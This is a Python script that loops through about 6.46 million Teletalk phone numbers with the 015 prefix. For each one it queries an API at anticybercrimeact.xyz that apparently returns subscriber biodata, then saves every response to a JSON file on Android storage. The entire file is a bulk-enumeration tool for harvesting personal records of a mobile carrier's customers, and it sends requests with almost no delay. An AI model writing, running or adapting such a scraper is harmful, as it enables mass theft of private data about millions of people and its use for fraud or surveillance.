import requests
import json
import time
import os

# Define the base URL and phone number prefix
base_url = "https://anticybercrimeact.xyz/api/BIO/teletalk.php?phone="
prefix = "015"

# Initialize an empty list to store responses
all_responses = []

# Loop through all possible Teletalk numbers (example range for 6.46 million users)
for i in range(12345678, 12345678 + 6460000):
    phone_number = prefix + str(i)
    url = f"{base_url}{phone_number}"
    
    # Send the request and get the response
    try:
        response = requests.get(url)
        response_data = response.json()  # Parse the JSON response
        
        # Append the response to the list
        all_responses.append({"phone_number": phone_number, "data": response_data})
        
        # Print success message with count only
        print(f"Success {i - 12345678 + 1}")
        
    except Exception as e:
        print(f"Error querying {phone_number}: {e}")
    
    # Optional: Delay to prevent server overload
    time.sleep(0.0001)  # Adjust as needed

# Define the storage path (Update this path if needed)
storage_path = "/storage/emulated/0/teletalk_data.json"  # Common Android path

# Ensure the directory exists
os.makedirs(os.path.dirname(storage_path), exist_ok=True)

# Save all responses to a JSON file in storage path
with open(storage_path, "w") as json_file:
    json.dump(all_responses, json_file, indent=4)

print(f"All data saved to {storage_path}")
